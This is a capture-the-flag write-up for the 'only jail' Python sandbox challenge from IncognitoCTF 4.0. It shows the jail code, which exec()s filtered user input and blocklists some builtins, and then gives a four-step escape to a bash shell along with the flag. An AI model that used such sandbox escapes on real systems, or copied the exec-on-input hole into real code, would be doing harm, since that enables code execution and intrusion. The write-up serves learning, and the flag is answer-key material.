## IncognitoCTF 4.0 - The only jail (Misc)

This was a simple pyJail challenge.
The challenge code was as follows:

**jail.py**

```python3
import string

ALLOWED_CHARS = string.ascii_letters + string.digits + '.' + '=' + "\"" + " " + "(" + ")" + "*" + ":"+"'"+","

FORBIDDEN_BUILTINS = ['open', 'eval', 'exec', 'execfile']

def check_input(input_str):
    for char in input_str:
        if char not in ALLOWED_CHARS:
            raise ValueError("Error: forbidden character '{}'".format(char))

def remove_builtins():
    for builtin in FORBIDDEN_BUILTINS:
        if builtin in globals():
            del globals()[builtin]

remove_builtins()

# start the jail
print("Welcome to the IIITL Jail! Escape if you can")

while True:
    try:
        user_input = input("jail> ")
        check_input(user_input)
        exec(user_input)
    except Exception as e:
        print("Error:", e)
```

**Solution**
1)	`import os`
2)  `os.system("bash")`
3)  `cd /home/ctf`
4)  `cat flag.txt`

Flag: `ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}`
